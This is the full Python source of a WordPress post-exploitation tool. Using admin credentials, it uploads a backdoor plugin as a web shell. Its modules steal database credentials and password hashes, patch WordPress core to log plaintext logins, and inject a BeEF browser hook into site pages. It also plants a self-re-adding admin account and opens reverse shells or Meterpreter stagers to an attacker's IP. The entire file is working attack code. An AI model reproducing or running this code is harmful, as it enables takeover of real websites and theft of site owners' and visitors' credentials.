import re
import sys
import base64
import readline
import requests
import argparse
from random import choice
from string import ascii_lowercase
__author__ = '(n00py)'


def uploadbackdoor(host,username,password,type,verbose, agent):
    if host.endswith('/'):
        host = host[:-1]
    url = host + '/wp-login.php'
    headers = {'user-agent': agent,
               'Accept-Encoding' : 'none'
    }
    payload = {'log': username,
               'pwd': password,
               'rememberme': 'forever',
               'wp-submit': 'log In',
               'redirect_to': host + '/wp-admin/',
               'testcookie': 1,
               }
    uploaddir = (''.join(choice(ascii_lowercase) for i in range(7)))
    session = requests.Session()

    r = session.post(url, headers=headers, data=payload)
    if verbose is True:
        print "Server Header: " + r.headers['Server']
    if r.status_code == 200:
        if verbose is True:
            print "Found Login Page"
    r3 = session.get(host + '/wp-admin/plugin-install.php?tab=upload',headers=headers)
    if r3.status_code == 200:
        if verbose is True:
            print "Logged in as Admin"
    look_for = 'name="_wpnonce" value="'
    try:
        nonceText = r3.text.split(look_for, 1)[1]
        nonce = nonceText[0:10]
        if verbose is True:
            print "Found CSRF Token: " + nonce
    except:
        print "Didn't find a CSRF token, check the URL and/or credentials."
        sys.exit(2)

    files = {'pluginzip': (uploaddir + '.zip', open(type +'.zip', 'rb')),
             '_wpnonce': (None, nonce),
             '_wp_http_referer': (None, host + '/wp-admin/plugin-install.php?tab=upload'),
             'install-plugin-submit': (None,'Install Now')

             }
    r4 = session.post(host + "/wp-admin/update.php?action=upload-plugin",headers=headers, files=files)
    if r.status_code == 200:
        print "Backdoor uploaded!"
        if "Plugin installed successfully" in r4.text:
            if verbose is True:
                print "Plugin installed successfully"

        if "Destination folder already exists" in r4.text:
            if verbose is True:
                print "Destination folder already exists"
    print "Upload Directory: " + uploaddir
    return uploaddir


def commandloop(host,uploaddir):
    while True:
        cmd = raw_input('os-shell> ')
        params = [('cmd', cmd.encode('base64'))]
        if (cmd == "quit") or (cmd == "exit"):
            sys.exit(2)
        elif cmd == "help" or cmd == "?":
            print '''
            Core Commands
            =============

                Command                   Description
                -------                   -----------
                ?                         Help menu
                beef                      Injects a BeEF hook into website
                dbcreds                   Prints the database credentials
                exit                      Terminate the session
                hashdump                  Dumps all WordPress password hashes
                help                      Help menu
                keylogger                 Patches WordPress core to log plaintext credentials
                keylog                    Displays keylog file
                meterpreter               Executes a PHP meterpreter stager to connect to metasploit
                persist                   Creates an admin account that will re-add itself
                quit                      Terminate the session
                shell                     Sends a TCP reverse shell to a netcat listener
                stealth                   Hides Yertle from the plugins page

                '''
        elif cmd == "hashdump":
            hashdump(host, uploaddir)
        elif cmd == "shell":
            shell(host, uploaddir)
        elif cmd == "stealth":
            stealth(host, uploaddir)
        elif cmd == "keylogger":
            keylogger(host, uploaddir)
        elif cmd == "keylog":
            keylog(host, uploaddir)
        elif cmd == "meterpreter":
            meterpreter(host, uploaddir)
        elif cmd == "beef":
            beefhook(host, uploaddir)
        elif cmd == "persist":
            persist(host, uploaddir)
        elif cmd == "dbcreds":
            creds = datacreds(host, uploaddir)
            print "Hostname: " + creds[0]
            print "Username: " +creds[1]
            print "Password: " +creds[2]
            print "Database: " + creds[3]
        else:
            print "Sent command: " + cmd
            sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
            print sendcommand.text


def reverseshell(host, ip, port,uploaddir):
    params = [('ip', ip), ('port', port)]
    print "Sending reverse shell to " + ip + " port " + port
    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/reverse.php", params=params)


def datacreds(host,uploaddir):
    params = [('cmd', 'cat ../../../wp-config.php'.encode('base64'))]
    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
    user =  credextract(sendcommand.text, 'DB_USER')
    password = credextract(sendcommand.text, 'DB_PASSWORD')
    host = credextract(sendcommand.text, 'DB_HOST')
    db = credextract(sendcommand.text, 'DB_NAME')
    return host, user, password, db


def credextract(list, key):
    s = list
    start = s.find(key)
    end = s.find(';', start)
    s = s[start:end]
    se = s.split("'")
    return se[2]


def shell(host,uploaddir):
    if safety(host, uploaddir):
        ip = raw_input('IP Address: ')
        port = raw_input('Port: ')
        params = [('cmd', ('php -r \'$sock=fsockopen("' + ip + '",' + port + ');exec("/bin/bash -i <&3 >&3 2>&3");\'').encode('base64'))]
        try:
            print "Sending reverse shell to " + ip + " port " + port
            requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params, timeout=1)
        except requests.exceptions.Timeout:
            pass


def keylog(host,uploaddir):
    params = [('cmd', ('cat passwords.txt').encode('base64'))]
    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
    print sendcommand.text


def stealth(host,uploaddir):
    if safety(host, uploaddir):
        hidden_shell = '''<?php
    $command = $_GET["cmd"];
    $command = substr($command, 0, -1);
    $command = base64_decode($command);

    if (class_exists('ReflectionFunction')) {
       $function = new ReflectionFunction('system');
       $thingy = $function->invoke($command );

    } elseif (function_exists('call_user_func_array')) {
       call_user_func_array('system', array($command));

    } elseif (function_exists('call_user_func')) {
       call_user_func('system', $command);

    } else {
       system($command);
    }

    ?>
    '''
        payload = hidden_shell.encode('base64')
        params = [
            ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > shell.php').encode('base64'))]
        requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)


def warning():
    cmd = raw_input('This module modifies files within the WordPress core.  Would you like to continue? (Y/n) ')
    if ("y" in cmd) or("Y" in cmd):
        return True
    else:
        return False


def meterpreter(host,uploaddir):
    if safety(host, uploaddir):
        ip = raw_input('IP Address: ')
        port = raw_input('Port: ')
        meter = '''<?php
    error_reporting(0);
    $ip   = '%s';
    $port = %s;
    if (($f = 'stream_socket_client') && is_callable($f)) {
        $s      = $f("tcp://{$ip}:{$port}");
        $s_type = 'stream';
    } elseif (($f = 'fsockopen') && is_callable($f)) {
        $s      = $f($ip, $port);
        $s_type = 'stream';
    } elseif (($f = 'socket_create') && is_callable($f)) {
        $s   = $f(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) {
            die();
        }
        $s_type = 'socket';
    } else {
        die('no socket funcs');
    }
    if (!$s) {
        die('no socket');
    }
    switch ($s_type) {
        case 'stream':
            $len = fread($s, 4);
            break;
        case 'socket':
            $len = socket_read($s, 4);
            break;
    }
    if (!$len) {
        die();
    }
    $a   = unpack("Nlen", $len);
    $len = $a['len'];
    $b   = '';
    while (strlen($b) < $len) {
        switch ($s_type) {
            case 'stream':
                $b .= fread($s, $len - strlen($b));
                break;
            case 'socket':
                $b .= socket_read($s, $len - strlen($b));
                break;
        }
    }
    $GLOBALS['msgsock']      = $s;
    $GLOBALS['msgsock_type'] = $s_type;
    eval($b);
    die();
    ?>
    ''' % (ip, port)
        payload = meter.encode('base64')
        params = [
            ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > meterpreter.php').encode('base64'))]
        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
        params = [
            ('cmd', 'php meterpreter.php'.encode('base64'))]
        try:
            print "Sending meterpreter stager to connect back to " + ip + ":" + port
            sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params, timeout=1)
        except requests.exceptions.Timeout:
            pass
        print sendcommand.text


def keylogger(host,uploaddir):
    if safety(host, uploaddir):
        if warning():
            hook = '''$credentials['remember'] = false;
             $file = 'wp-content/plugins/%s/passwords.txt';
             $credz = date('Y-m-d') . " - Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'] . "\n";
             file_put_contents($file, $credz, FILE_APPEND | LOCK_EX);''' % (uploaddir)

            hook = hook.encode('base64')
            injector = '''<?php
        $real = "JGNyZWRlbnRpYWxzWydyZW1lbWJlciddID0gZmFsc2U7";
        $evil = "%s";
        $real = base64_decode($real);
        $evil = base64_decode($evil);

        $orig=file_get_contents('../../../wp-includes/user.php');
        $orig=str_replace("$real", "$evil",$orig);
        file_put_contents('../../../wp-includes/user.php', $orig);
        ?>''' % hook
            payload = injector.encode('base64')
            params = [
                ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > backdoor.php').encode('base64'))]
            requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
            params = [
                ('cmd', 'php backdoor.php'.encode('base64'))]
            requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
            print "wp_signon function patched.  Do not run this more than once.  Use 'keylog' to check the log file."


def hashdump(host,uploaddir):
    items = datacreds(host, uploaddir)
    dumper = '''<?php
$servername = "%s";
$username = "%s";
$password = "%s";
$dbname = "%s";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT ID, user_login, user_pass, user_email FROM wp_users";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    // output data of each row
    while($row = $result->fetch_assoc()) {
        echo "ID: " . $row["ID"]. "  - Username: " . $row["user_login"]. "  Password: " . $row["user_pass"]. "  Email: " . $row["user_email"]. "\n";
    }
} else {
    echo "0 results";
}
$conn->close();
?> ''' % (items[0], items[1], items[2], items[3])
    payload = dumper.encode('base64')
    if safety(host, uploaddir):
        params = [
        ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > hashdump.php').encode('base64'))]
        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
        params = [
        ('cmd', 'php hashdump.php'.encode('base64'))]
        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
        print sendcommand.text


def beefhook(host,uploaddir):
    if warning():
        ip = raw_input('IP Address: ')
        params = [
            ('cmd',('sed -i \'1i\<script src=\"http://' + ip + ':3000/hook.js\"\>\</script\>\'  ../../../wp-blog-header.php').encode('base64'))]
        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
        print "BeEF hook added!  Check BeEF for any hooked clients. Do not run this multiple times."

def persist(host,uploaddir):
    if safety(host, uploaddir):
        username = raw_input('Username: ')
        email = raw_input('Email: ')
        password = raw_input('Password: ')
        evilcode = '''
        $new_user = '%s';
        $new_user_email = '%s';
        $new_user_password = '%s';

    if(!username_exists($new_user_email)) {
      $user_id = wp_create_user($new_user, $new_user_password, $new_user_email);

      wp_update_user(array('ID' => $user_id, 'nickname' => $new_user, 'user_email' => $new_user_email));
    }
      $user = new WP_User($user_id);
      $user->set_role('administrator');
    ''' % (username, email, password)
        payload = evilcode.encode('base64')
        if warning():
            params = [
                ('cmd',('php -r \'echo base64_decode("' + payload + '");\' >> ../../../wp-blog-header.php').encode('base64'))]
            sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
            print "Added persistent user \"%s\" with the password \"%s\"." % (username, password)


def safety(host,uploaddir):
    params = [('cmd', ('which php').encode('base64'))] #Checks which PHP
    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
    results = sendcommand.text
    params = [('cmd', ('readlink -e ' + results).encode('base64'))] # resolves Symlinks
    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
    if "php-cgi" in sendcommand.text: #issues with php-cgi.  Aborts the module.
        print "The PHP interpreter on this system is not compatible with this module."
        return False
    else:
        return True

def exist_check(target,uploaddir):
    r = requests.get(target + '/wp-content/plugins/' + uploaddir + '/shell.php')
    if r.status_code == 200:
        return True
    else:
        return False

def printbanner():
    banner = """\
     _..---.--.    __   __        _   _
   .'\ __|/O.__)   \ \ / /__ _ __| |_| | ___
  /__.' _/ .-'_\    \ V / _ \ '__| __| |/ _ \.
 (____.'.-_\____)    | |  __/ |  | |_| |  __/
  (_/ _)__(_ \_)\_   |_|\___|_|   \__|_|\___|
   (_..)--(.._)'--'         ~n00py~
      Post-exploitation Module for Wordpress
                     v.1.1.0
    """
    print banner


def argcheck(interactive,reverse,target):

    if interactive is False and reverse is False:
        print "You must choose a type of shell: --reverse or --interactive"
        sys.exit()

    if "http" not in target:
        print"Please include the protocol in the URL"
        sys.exit()


def main():
    parser = argparse.ArgumentParser(description='This a post-exploitation module for Wordpress')
    parser.add_argument('-i','--interactive', help='Interactive command shell',required=False, action='store_true', default=True)
    parser.add_argument('-r','--reverse',help='Reverse Shell', required=False, action='store_true')
    parser.add_argument('-t','--target',help='URL of target', required=True)
    parser.add_argument('-u','--username',help='Admin username', required=False)
    parser.add_argument('-p','--password',help='Admin password', required=False)
    parser.add_argument('-a', '--agent', help='Custom User Agent', required=False, default='Yertle uploader')
    parser.add_argument('-li','--ip',help='Listener IP', required=False)
    parser.add_argument('-lp','--port',help='Listener Port', required=False)
    parser.add_argument('-v','--verbose',help=' Verbose output.', required=False, action='store_true')
    parser.add_argument('-e','--existing',help=' Skips uploading a shell, and connects to existing shell', required=False)
    args = parser.parse_args()
    printbanner()
    argcheck(args.interactive,args.reverse,args.target)

    if not args.reverse:
        if args.existing is None:
            if args.username is None or args.password is None:
                print "Username and Password are required"
                sys.exit()
            uploaddir = uploadbackdoor(args.target, args.username, args.password, "shell", args.verbose, args.agent)
        else:
            uploaddir = args.existing
        if exist_check(args.target, uploaddir):
            commandloop(args.target, uploaddir)
        else:
            print "Existing shell not found.  Please verify the path or upload a new shell."

    if args.reverse and args.interactive:
        if args.ip is None or args.port is None:
            print "For a reverse shell, a listening IP and Port are required"
            sys.exit()
        if args.existing is None:
            if args.username is None or args.password is None:
                print "Username and Password are required"
                sys.exit()
            uploaddir = uploadbackdoor(args.target, args.username, args.password, "reverse", args.verbose, args.agent)
        else:
            uploaddir = args.existing
        reverseshell(args.target, args.ip, args.port, uploaddir)


if __name__ == "__main__":
    main()
